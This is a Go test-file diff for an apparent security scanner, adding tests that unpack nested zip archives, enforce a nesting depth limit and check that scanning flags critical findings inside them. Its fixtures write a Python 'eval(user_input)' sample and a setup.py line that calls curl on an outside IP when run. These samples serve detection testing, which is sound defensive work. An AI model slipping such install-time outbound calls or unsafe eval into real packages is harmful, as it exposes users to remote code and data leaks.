@@ -1,9 +1,13 @@
 package main
 
 import (
+	"archive/zip"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
+
+	"github.com/argusgate/argus/pkg/scanner"
 )
 
 // ---------------------------------------------------------------------------
@@ -135,6 +139,94 @@ func TestInstallCmd_JSONOutput(t *testing.T) {
 	}
 	if out[0] != '{' {
 		t.Errorf("expected JSON object; got: %.80s", out)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// expandNestedArchives
+// ---------------------------------------------------------------------------
+
+func TestExpandNestedArchives_Zip(t *testing.T) {
+	dir := t.TempDir()
+	zipPath := filepath.Join(dir, "vendor.zip")
+
+	// Build a zip containing a Python file with an eval call.
+	zf, err := os.Create(zipPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	zw := zip.NewWriter(zf)
+	entry, err := zw.Create("evil.py")
+	if err != nil {
+		t.Fatal(err)
+	}
+	entry.Write([]byte(`eval(user_input)`))
+	zw.Close()
+	zf.Close()
+
+	if err := expandNestedArchives(dir, 0); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+
+	extractedDir := zipPath + "!"
+	if _, err := os.Stat(extractedDir); err != nil {
+		t.Fatalf("expected extracted dir %s; got: %v", extractedDir, err)
+	}
+	if _, err := os.Stat(filepath.Join(extractedDir, "evil.py")); err != nil {
+		t.Fatal("expected evil.py in extracted directory")
+	}
+}
+
+func TestExpandNestedArchives_DepthLimit(t *testing.T) {
+	// Calling with depth >= maxNestDepth must be a no-op (no extraction).
+	dir := t.TempDir()
+	zipPath := filepath.Join(dir, "bomb.zip")
+	zf, _ := os.Create(zipPath)
+	zw := zip.NewWriter(zf)
+	zw.Create("x.py")
+	zw.Close()
+	zf.Close()
+
+	if err := expandNestedArchives(dir, maxNestDepth); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if _, err := os.Stat(zipPath + "!"); err == nil {
+		t.Error("should not have extracted archive at max depth")
+	}
+}
+
+func TestExpandNestedArchives_Integration(t *testing.T) {
+	// End-to-end: nested archive findings surface via scanner.Scan.
+	dir := t.TempDir()
+	zipPath := filepath.Join(dir, "vendor.zip")
+
+	zf, _ := os.Create(zipPath)
+	zw := zip.NewWriter(zf)
+	entry, _ := zw.Create("setup.py")
+	entry.Write([]byte(`import subprocess; subprocess.Popen(["curl", "203.0.113.1"])`))
+	zw.Close()
+	zf.Close()
+
+	if err := expandNestedArchives(dir, 0); err != nil {
+		t.Fatalf("expandNestedArchives error: %v", err)
+	}
+
+	report, err := scanner.Scan(dir)
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	if !report.HasCritical {
+		t.Error("expected critical finding inside nested archive; got none")
+	}
+	found := false
+	for _, f := range report.Findings {
+		if strings.Contains(f.File, "vendor.zip!") {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Errorf("expected finding with 'vendor.zip!' in path; findings: %+v", report.Findings)
 	}
 }
 
